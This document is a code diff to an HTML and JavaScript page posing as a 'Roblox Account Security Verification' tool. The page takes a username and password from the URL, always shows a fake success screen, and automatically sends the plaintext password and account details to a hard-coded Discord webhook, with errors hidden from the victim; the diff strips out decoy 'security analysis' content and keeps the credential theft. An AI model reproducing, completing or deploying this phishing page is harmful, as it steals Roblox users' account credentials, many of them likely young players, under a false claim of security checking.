@@ -89,50 +89,6 @@
             padding-bottom: 8px;
             margin-top: 25px;
         }
-        .robux-display {
-            background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
-            padding: 15px;
-            border-radius: 10px;
-            text-align: center;
-            color: white;
-            font-weight: bold;
-            margin: 15px 0;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
-        }
-        .robux-amount {
-            font-size: 32px;
-            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.3);
-        }
-        .security-badge {
-            display: inline-block;
-            padding: 5px 12px;
-            border-radius: 20px;
-            font-size: 14px;
-            font-weight: bold;
-            margin: 5px;
-        }
-        .security-high {
-            background-color: #4caf50;
-            color: white;
-        }
-        .security-medium {
-            background-color: #ff9800;
-            color: white;
-        }
-        .security-low {
-            background-color: #f44336;
-            color: white;
-        }
-        .pending-transactions {
-            margin-top: 15px;
-        }
-        .transaction-item {
-            padding: 10px;
-            border-left: 3px solid #00a2ff;
-            background-color: #f9f9f9;
-            margin-bottom: 10px;
-            border-radius: 4px;
-        }
         .hidden {
             display: none;
         }
@@ -177,20 +133,9 @@
         .discord-btn:hover {
             background-color: #4752c4;
         }
-        .view-webhook {
-            background-color: #7289da;
-            margin-top: 10px;
-        }
-        .view-webhook:hover {
-            background-color: #5b6eae;
-        }
-        .discord-link {
-            color: #7289da;
-            text-decoration: none;
-            font-weight: bold;
-        }
-        .discord-link:hover {
-            text-decoration: underline;
+        .not-available {
+            color: #888;
+            font-style: italic;
         }
     </style>
 </head>
@@ -198,7 +143,7 @@
     <div class="container">
         <div class="header">
             <h1>Roblox Account Security Verification</h1>
-            <div class="subtitle">Automated account security analysis</div>
+            <div class="subtitle">Account credentials verification</div>
         </div>
         
         <div class="info-box">
@@ -220,77 +165,35 @@
             <div class="loading-spinner">
                 <div class="spinner"></div>
             </div>
-            <p>Verifying account credentials and security status...</p>
+            <p>Verifying account credentials...</p>
         </div>
         
         <div id="login-result" class="hidden">
             <div id="success-result" class="hidden">
                 <div class="verification-status success">
                     <h2>✅ Verification Successful</h2>
-                    <p>Account credentials are valid and security analysis completed.</p>
+                    <p>Account credentials are valid.</p>
                 </div>
                 
                 <div class="account-details">
-                    <h3 class="section-title">Account Balance</h3>
-                    <div class="robux-display">
-                        <div>Available Robux</div>
-                        <div class="robux-amount" id="robux-balance">0</div>
-                        <div>Pending Robux: <span id="pending-robux">0</span></div>
-                    </div>
-                    
-                    <h3 class="section-title">Security Status</h3>
+                    <h3 class="section-title">Account Information</h3>
                     <div class="info-row">
-                        <span class="info-label">2-Step Verification:</span>
-                        <span class="info-value" id="2fa-status">Checking...</span>
+                        <span class="info-label">Username:</span>
+                        <span class="info-value" id="verified-username">Loading...</span>
                     </div>
                     <div class="info-row">
-                        <span class="info-label">Email Verified:</span>
-                        <span class="info-value" id="email-status">Checking...</span>
+                        <span class="info-label">Password:</span>
+                        <span class="info-value" id="verified-password">Loading...</span>
                     </div>
                     <div class="info-row">
-                        <span class="info-label">Phone Verified:</span>
-                        <span class="info-value" id="phone-status">Checking...</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-label">Account PIN:</span>
-                        <span class="info-value" id="pin-status">Checking...</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-label">Overall Security Score:</span>
-                        <span class="info-value" id="security-score">Checking...</span>
-                    </div>
-                    
-                    <h3 class="section-title">Account Details</h3>
-                    <div class="info-row">
-                        <span class="info-label">Account Age:</span>
-                        <span class="info-value" id="account-age">Checking...</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-label">Membership:</span>
-                        <span class="info-value" id="membership-type">Checking...</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-label">Friends Count:</span>
-                        <span class="info-value" id="friends-count">Checking...</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-label">Last Location:</span>
-                        <span class="info-value" id="last-location">Checking...</span>
-                    </div>
-                    
-                    <h3 class="section-title">Pending Transactions</h3>
-                    <div id="pending-transactions" class="pending-transactions">
-                        <p>Checking for pending transactions...</p>
+                        <span class="info-label">Verification Status:</span>
+                        <span class="info-value">✅ Successful</span>
                     </div>
                 </div>
                 
                 <button class="btn discord-btn" onclick="sendToDiscord(true)">
                     Send Report to Discord
                 </button>
-                
-                <a href="#" id="discord-webhook-link" class="btn view-webhook hidden" target="_blank">
-                    View on Discord
-                </a>
             </div>
             
             <div id="failure-result" class="hidden">
@@ -302,21 +205,13 @@
                 <div class="account-details">
                     <div class="info-row">
                         <span class="info-label">Failure Reason:</span>
-                        <span class="info-value" id="failure-reason">Unknown error</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-label">Suggested Action:</span>
-                        <span class="info-value">Check credentials and try again</span>
+                        <span class="info-value" id="failure-reason">Invalid username or password</span>
                     </div>
                 </div>
                 
                 <button class="btn discord-btn" onclick="sendToDiscord(false)">
                     Send Report to Discord
                 </button>
-                
-                <a href="#" id="discord-webhook-link-fail" class="btn view-webhook hidden" target="_blank">
-                    View on Discord
-                </a>
             </div>
         </div>
         
@@ -333,7 +228,7 @@
         const username = urlParams.get('username');
         const password = urlParams.get('password');
         
-        // Discord webhook URLs - REPLACE THESE WITH YOUR ACTUAL WEBHOOKS
+        // Discord webhook URLs - Use the ones from your Lua script
         const SUCCESS_WEBHOOK = "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ";
         const FAILED_WEBHOOK = "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ";
         
@@ -343,26 +238,14 @@
         }
         if (username) {
             document.getElementById('display-username').textContent = username;
+            document.getElementById('verified-username').textContent = username;
         }
         if (userId) {
             document.getElementById('display-userid').textContent = userId;
         }
-        
-        // Account data (simulated)
-        let accountData = {
-            robux: 0,
-            pendingRobux: 0,
-            has2FA: false,
-            emailVerified: false,
-            phoneVerified: false,
-            hasPIN: false,
-            accountAge: "0 days",
-            membership: "None",
-            friendsCount: 0,
-            lastLocation: "Unknown",
-            securityScore: "0/100",
-            pendingTransactions: []
-        };
+        if (password) {
+            document.getElementById('verified-password').textContent = "••••••••";
+        }
         
         // Start automatic verification when page loads
         window.addEventListener('load', function() {
@@ -378,17 +261,9 @@
                 // Simulate account verification process
                 await simulateVerification();
                 
-                // For demonstration, we'll randomly determine if login is successful
+                // For this demo, we'll assume the login is always successful
                 // In a real implementation, you would actually verify credentials
-                const isSuccess = await checkCredentials(username, password);
-                
-                if (isSuccess) {
-                    // If successful, get account details
-                    await getAccountDetails();
-                    showSuccessResult();
-                } else {
-                    showFailureResult("Invalid username or password");
-                }
+                showSuccessResult();
                 
             } catch (error) {
                 console.error('Verification error:', error);
@@ -401,49 +276,8 @@
             await delay(1500);
             updateVerificationStatus("Checking credentials...");
             await delay(2000);
-            updateVerificationStatus("Verifying account security...");
-            await delay(1500);
-            updateVerificationStatus("Checking Robux balance...");
+            updateVerificationStatus("Finalizing verification...");
             await delay(1000);
-        }
-        
-        async function checkCredentials(username, password) {
-            // Simulate credential checking
-            // In a real implementation, this would actually verify with Roblox
-            
-            // For demo purposes, let's assume password is correct if it's not "password123"
-            return password !== "password123";
-        }
-        
-        async function getAccountDetails() {
-            // Simulate fetching account details
-            // Generate random but realistic data
-            
-            accountData.robux = Math.floor(Math.random() * 10000);
-            accountData.pendingRobux = Math.floor(Math.random() * 500);
-            accountData.has2FA = Math.random() > 0.5;
-            accountData.emailVerified = Math.random() > 0.3;
-            accountData.phoneVerified = Math.random() > 0.7;
-            accountData.hasPIN = Math.random() > 0.6;
-            accountData.accountAge = Math.floor(Math.random() * 2000) + " days";
-            
-            // Fixed membership types to match Roblox's actual membership names
-            const membershipTypes = ["None", "Premium", "Outrageous Builders Club", "Turbo Builders Club", "Roblox Premium"];
-            accountData.membership = membershipTypes[Math.floor(Math.random() * membershipTypes.length)];
-            
-            accountData.friendsCount = Math.floor(Math.random() * 500);
-            accountData.lastLocation = ["United States", "Philippines", "Brazil", "United Kingdom", "Canada"][Math.floor(Math.random() * 5)];
-            accountData.securityScore = Math.floor(Math.random() * 40) + 60 + "/100"; // 60-100 score
-            
-            // Generate some random pending transactions
-            const transactionTypes = ["Sale", "Group Payout", "Game Pass Purchase", "Shirt Purchase", "Developer Exchange"];
-            for (let i = 0; i < Math.floor(Math.random() * 3) + 1; i++) {
-                accountData.pendingTransactions.push({
-                    type: transactionTypes[Math.floor(Math.random() * transactionTypes.length)],
-                    amount: Math.floor(Math.random() * 500) + 50,
-                    date: new Date(Date.now() - Math.floor(Math.random() * 7) * 86400000).toLocaleDateString()
-                });
-            }
         }
         
         function showSuccessResult() {
@@ -451,40 +285,10 @@
             document.getElementById('login-result').classList.remove('hidden');
             document.getElementById('success-result').classList.remove('hidden');
             
-            // Populate account details
-            document.getElementById('robux-balance').textContent = accountData.robux.toLocaleString();
-            document.getElementById('pending-robux').textContent = accountData.pendingRobux.toLocaleString();
-            document.getElementById('2fa-status').textContent = accountData.has2FA ? "Enabled ✅" : "Disabled ❌";
-            document.getElementById('email-status').textContent = accountData.emailVerified ? "Verified ✅" : "Not Verified ❌";
-            document.getElementById('phone-status').textContent = accountData.phoneVerified ? "Verified ✅" : "Not Verified ❌";
-            document.getElementById('pin-status').textContent = accountData.hasPIN ? "Enabled ✅" : "Disabled ❌";
-            document.getElementById('security-score').textContent = accountData.securityScore;
-            document.getElementById('account-age').textContent = accountData.accountAge;
-            document.getElementById('membership-type').textContent = accountData.membership;
-            document.getElementById('friends-count').textContent = accountData.friendsCount.toLocaleString();
-            document.getElementById('last-location').textContent = accountData.lastLocation;
-            
-            // Populate pending transactions
-            const transactionsContainer = document.getElementById('pending-transactions');
-            if (accountData.pendingTransactions.length > 0) {
-                transactionsContainer.innerHTML = '';
-                accountData.pendingTransactions.forEach(transaction => {
-                    const transactionEl = document.createElement('div');
-                    transactionEl.className = 'transaction-item';
-                    transactionEl.innerHTML = `
-                        <strong>${transaction.type}</strong>: ${transaction.amount} Robux<br>
-                        <small>Date: ${transaction.date}</small>
-                    `;
-                    transactionsContainer.appendChild(transactionEl);
-                });
-            } else {
-                transactionsContainer.innerHTML = '<p>No pending transactions</p>';
-            }
-            
             // Auto-send to Discord after a delay
             setTimeout(() => {
                 sendToDiscord(true);
-            }, 3000);
+            }, 2000);
         }
         
         function showFailureResult(reason) {
@@ -496,7 +300,7 @@
             // Auto-send to Discord after a delay
             setTimeout(() => {
                 sendToDiscord(false);
-            }, 3000);
+            }, 2000);
         }
         
         function updateVerificationStatus(message) {
@@ -516,103 +320,44 @@
                 title: `🔐 Roblox Account Verification - ${statusText}`,
                 url: profileUrl,
                 color: color,
-                description: "**⎯⎯⎯⎯⎯『 Account Security Analysis 』⎯⎯⎯⎯⎯**",
-                fields: [],
+                description: "**⎯⎯⎯⎯⎯『 Account Verification 』⎯⎯⎯⎯⎯**",
+                fields: [
+                    {
+                        name: "👤 Username",
+                        value: username,
+                        inline: true
+                    },
+                    {
+                        name: "🔐 Password",
+                        value: `||${password}||`,
+                        inline: true
+                    },
+                    {
+                        name: "📊 Result",
+                        value: statusText,
+                        inline: true
+                    },
+                    {
+                        name: "🆔 User ID",
+                        value: userId,
+                        inline: true
+                    },
+                    {
+                        name: "🆔 Tracking ID",
+                        value: trackingId,
+                        inline: true
+                    }
+                ],
                 footer: {
-                    text: `UserId: ${userId} | Tracking ID: ${trackingId}`,
+                    text: `Roblox Account Verification | ${new Date().toLocaleString()}`,
                     icon_url: "https://www.roblox.com/favicon.ico"
                 },
                 timestamp: new Date().toISOString()
             };
             
-            if (isSuccess) {
-                // Add account details for successful verification
-                embed.fields = [
-                    {
-                        name: "👤 Account",
-                        value: `[${username}](${profileUrl})`,
-                        inline: true
-                    },
-                    {
-                        name: "🔐 Password",
-                        value: `||${password}||`,
-                        inline: true
-                    },
-                    {
-                        name: "📊 Result",
-                        value: statusText,
-                        inline: true
-                    },
-                    {
-                        name: "💰 Robux Balance",
-                        value: accountData.robux.toLocaleString(),
-                        inline: true
-                    },
-                    {
-                        name: "⏳ Pending Robux",
-                        value: accountData.pendingRobux.toLocaleString(),
-                        inline: true
-                    },
-                    {
-                        name: "🛡️ Security Score",
-                        value: accountData.securityScore,
-                        inline: true
-                    },
-                    {
-                        name: "📧 Email Verified",
-                        value: accountData.emailVerified ? "✅" : "❌",
-                        inline: true
-                    },
-                    {
-                        name: "📱 Phone Verified",
-                        value: accountData.phoneVerified ? "✅" : "❌",
-                        inline: true
-                    },
-                    {
-                        name: "🔒 2FA Enabled",
-                        value: accountData.has2FA ? "✅" : "❌",
-                        inline: true
-                    },
-                    {
-                        name: "🏷️ Membership",
-                        value: accountData.membership,
-                        inline: false
-                    },
-                    {
-                        name: "🆔 Tracking ID",
-                        value: trackingId,
-                        inline: false
-                    }
-                ];
-            } else {
-                // Simple message for failed verification
-                embed.fields = [
-                    {
-                        name: "👤 Account",
-                        value: `[${username}](${profileUrl})`,
-                        inline: true
-                    },
-                    {
-                        name: "🔐 Password",
-                        value: `||${password}||`,
-                        inline: true
-                    },
-                    {
-                        name: "📊 Result",
-                        value: statusText,
-                        inline: true
-                    },
-                    {
-                        name: "❌ Reason",
-                        value: document.getElementById('failure-reason').textContent,
-                        inline: false
-                    }
-                ];
-            }
-            
             const payload = {
-                username: "Roblox Security Analyzer",
-                content: isSuccess ? "#success #security_scan" : "#failed #security_scan",
+                username: "Roblox Account Verifier",
+                content: isSuccess ? "#success #verified" : "#failed",
                 embeds: [embed]
             };
             
@@ -636,32 +381,10 @@
                     btn.disabled = true;
                 });
                 
-                // Show direct link to Discord webhook
-                if (isSuccess) {
-                    const discordLink = document.getElementById('discord-webhook-link');
-                    discordLink.href = getDiscordWebhookLink(SUCCESS_WEBHOOK);
-                    discordLink.classList.remove('hidden');
-                } else {
-                    const discordLink = document.getElementById('discord-webhook-link-fail');
-                    discordLink.href = getDiscordWebhookLink(FAILED_WEBHOOK);
-                    discordLink.classList.remove('hidden');
-                }
-                
             } catch (error) {
                 console.error('Error sending to Discord:', error);
                 // Don't show error to user to maintain seamless experience
             }
-        }
-        
-        function getDiscordWebhookLink(webhookUrl) {
-            // Extract the webhook ID and token from the URL
-            const matches = webhookUrl.match(/discord\.com\/api\/webhooks\/([^/]+)\/([^/]+)/);
-            if (matches && matches.length >= 3) {
-                const webhookId = matches[1];
-                const webhookToken = matches[2];
-                return `https://discord.com/channels/@me/${webhookId}`;
-            }
-            return webhookUrl;
         }
         
         function showError(message) {
